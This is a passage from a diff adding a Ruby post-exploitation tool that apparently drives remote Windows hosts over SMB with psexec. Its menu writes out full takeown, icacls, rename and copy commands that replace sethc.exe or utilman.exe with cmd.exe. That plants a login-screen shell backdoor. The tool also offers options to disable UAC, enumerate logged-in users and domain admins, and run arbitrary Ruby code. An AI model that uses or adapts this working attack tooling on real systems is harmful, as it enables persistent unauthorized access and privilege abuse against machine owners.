+          puts "2) ".white + "Repair Sticky Keys Prompt (sethc.exe)".light_yellow
+          puts "3) ".white + "Bacldoor Utilman assistant (utilman.exe)".light_yellow
+          puts "4) ".white + "Repair Utilman assistant (utilman.exe)".light_yellow
+          puts
+          line = Readline.readline("(Usage Selection)> ", true)
+          answer = line.chomp
+          if answer.to_i > 0 and answer.to_i <= 4
+            if answer.to_i == 1
+              # Sethc.exe swap out, enable shell via sticky keys prompt at login :)
+              puts "[".light_blue + "*".white + "]".light_blue + " Attempting to run Swaparoo for the Sticky Keys backdoor (sethc.exe)".white
+              commands = [ 
+                "takeown /f %SYSTEMROOT%\\\\system32\\\\sethc.exe", 
+                "icacls %SYSTEMROOT%\\\\system32\\\\sethc.exe /grant administrators:f", 
+                "rename %SYSTEMROOT%\\\\system32\\\\sethc.exe  sethc.exe.bak", 
+                "copy %SYSTEMROOT%\\\\system32\\\\cmd.exe %SYSTEMROOT%\\\\system32\\\\cmd3.exe", 
+                "rename %SYSTEMROOT%\\\\system32\\\\cmd3.exe sethc.exe" ]
+            elsif answer.to_i == 2
+              # Repair the sethc.exe swap out back to normal
+              puts "[".light_blue + "*".white + "]".light_blue + " Attempting to run Swaparoo Clean-Up for the Sticky Keys backdoor (sethc.exe)".white
+              commands = [ 
+                "takeown /f %SYSTEMROOT%\\\\system32\\\\sethc.exe", 
+                "icacls %SYSTEMROOT%\\\\system32\\\\sethc.exe /grant administrators:f",
+                "takeown /f %SYSTEMROOT%\\\\system32\\\\sethc.exe.bak", 
+                "icacls %SYSTEMROOT%\\\\system32\\\\sethc.exe.bak /grant Administrators:f",
+                "del %SYSTEMROOT%\\\\system32\\\\sethc.exe", 
+                "rename %SYSTEMROOT%\\\\system32\\\\sethc.exe.bak sethc.exe" ]
+            elsif answer.to_i == 3
+              # Utilman.exe swap out, enable shell via login assistance features at login screen :)
+              puts "[".light_blue + "*".white + "]".light_blue + " Attempting to run Swaparoo for the Utilman backdoor (utilman.exe)".white
+              commands = [ 
+                "takeown /f %SYSTEMROOT%\\\\system32\\\\Utilman.exe", 
+                "icacls %SYSTEMROOT%\\\\system32\\\\Utilman.exe /grant administrators:f", 
+                "rename %SYSTEMROOT%\\\\system32\\\\Utilman.exe  Utilman.exe.bak", 
+                "copy %SYSTEMROOT%\\\\system32\\\\cmd.exe %SYSTEMROOT%\\\\system32\\\\cmd3.exe", 
+                "rename %SYSTEMROOT%\\\\system32\\\\cmd3.exe Utilman.exe" ]
+            elsif answer.to_i == 4
+              # Repair the utilman.exe swap out back to normal
+              puts "[".light_blue + "*".white + "]".light_blue + " Attempting to run Swaparoo Clean-Up for the Utilman backdoor (utilman.exe)".white
+              commands = [ 
+                "takeown /f %SYSTEMROOT%\\\\system32\\\\Utilman.exe", 
+                "icacls %SYSTEMROOT%\\\\system32\\\\Utilman.exe /grant administrators:f",
+                "takeown /f %SYSTEMROOT%\\\\system32\\\\utilman.exe.bak", 
+                "icacls %SYSTEMROOT%\\\\system32\\\\utilman.exe.bak /grant Administrators:f", 
+                "del %SYSTEMROOT%\\\\system32\\\\Utilman.exe",
+                "rename %SYSTEMROOT%\\\\system32\\\\Utilman.exe.bak Utilman.exe" ]
+            end
+            files=[]
+            retries=0
+            commands.each do |cmd|
+              begin
+                puts "[".light_blue + "*".white + "]".light_blue + " Executing: #{cmd}".white
+                text = "#{tmp}\\#{Rex::Text.rand_text_alpha(16)}.txt"
+                bat  = "#{tmp}\\#{Rex::Text.rand_text_alpha(16)}.bat"
+                cmdexec = "%COMSPEC% /C echo #{cmd} ^> #{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
+                smb_psexec(cmdexec, false)
+#                get_output(text, false) # Not needed, but you can uncomment if you need to troubleshoot problems....
+                files << text
+                files << bat
+              rescue Rex::Proto::SMB::Exceptions::InvalidCommand => e
+                puts "[".light_blue + "*".white + "]".light_blue + " Error running command!".white
+                if retries.to_i <= 3
+                  puts "[".light_blue + "*".white + "]".light_blue + " Going to retry things again....".white
+                  retries = retries.to_i + 1
+                  retry
+                else
+                  puts "[".light_blue + "*".white + "]".light_blue + " Giving up on things, idk....".white
+                end
+              end
+            end
+            puts "[".light_blue + "*".white + "]".light_blue + " Running quick cleanup....".white unless files.empty?
+            cleanup_after(files, true)
+            break
+          else
+            puts "[".light_red + "*".white + "]".light_red + " Invalid Selection: #{answer}".white
+            puts "[".light_red + "*".white + "]".light_red + " Please select a valid option from the menu below.....".white
+            puts
+          end
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^uac.check/i
+      if @working
+        check_uac
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^disable.uac/i
+      if @working
+        disable_uac
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^enable.uac/i
+      if @working
+        enable_uac
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^active.users|^loggedin/i
+      if @working
+        users = check_active_users
+        if not users.nil? and users.size > 0
+          puts "[".light_green + "*".white + "]".light_green + " Enumerated Logged in Users!".white
+          Dir.mkdir(RESULTS + @target + '/') unless File.exists?(RESULTS + @target + '/') and File.directory?(RESULTS + @target + '/')
+          f=File.open(RESULTS + @target + '/loggedin_users.txt', 'w+')
+          users.each do |usr|
+            puts "   #{usr}".white
+            f.puts usr
+          end
+          f.close
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^domain.admin/i
+      if @working
+        admins = check_domain_admin
+        if not admins.nil? and admins.size > 0
+          puts "[".light_green + "*".white + "]".light_green + " Domain Administrators: ".white
+          Dir.mkdir(RESULTS + @target + '/') unless File.exists?(RESULTS + @target + '/') and File.directory?(RESULTS + @target + '/')
+          f=File.open(RESULTS + @target + '/domain_admin.txt', 'w+')
+          admins.each do |usr|
+            puts "   #{usr}".white
+            f.puts usr
+          end
+          f.close
+        end
+      else
+        puts "You have not validated credentials yet".light_red + "!".white
+        puts "Use the config option and then try again".light_red + "......".white
+      end
+      puts
+      core_shell
+    when /^rb (.+)/i
+      code=$1.chomp
+      rubyme("#{code}")
+      puts
+      core_shell
+    when /^local$/i
+      local_os_shell
+      puts
+      core_shell
+    else
+      cls
+      puts 
+      puts "Oops, Didn't quite understand that one".light_red + "!".white
+      puts "Please Choose a Valid Option From Menu Below Next Time".light_red + "....".white
+      puts
+      show_usage
+      core_shell
+    end
+  end
+end
+
+### MAIN ###
+options = {}
+optparse = OptionParser.new do |opts| 
+  opts.banner = "Usage:".light_blue + "#{$0} ".white + "[".light_blue + "OPTIONS".white + "]".light_blue
+  opts.separator ""
+  opts.separator "EX: #{$0} -m"
+  opts.separator ""
+  opts.separator "Options: ".light_blue
+  opts.on('-m', '--main', "\n\tMain Menu".white) do |loc|
+    options[:loc] = 1
+  end
+  opts.on('-h', '--help', "\n\tHelp Menu".white) do 
+    cls
+    banner
+    puts
+    puts opts
+    puts
+    exit 69;
+  end
+end
+begin
+  foo = ARGV[0] || ARGV[0] = "-m"
+  optparse.parse!
+  mandatory = [:loc]
+  missing = mandatory.select{ |param| options[param].nil? }
+  if not missing.empty?
+    cls
+    banner
+    puts
+    puts "Missing options: ".light_red + " #{missing.join(', ')}".white  
+    puts optparse
+    exit 666;
+  end
+rescue OptionParser::InvalidOption, OptionParser::MissingArgument
+  cls
+  banner
+  puts
+  puts $!.to_s.light_red
+  puts
+  puts optparse
+  puts
+  exit 666;   
+end
+
+cls
+banner
+puts
+Dir.mkdir(RESULTS) unless File.exists?(RESULTS) and File.directory?(RESULTS)
+core_shell
+@smb.close if @smb
+@socket.close if @socket
+puts
+puts
+# EOF
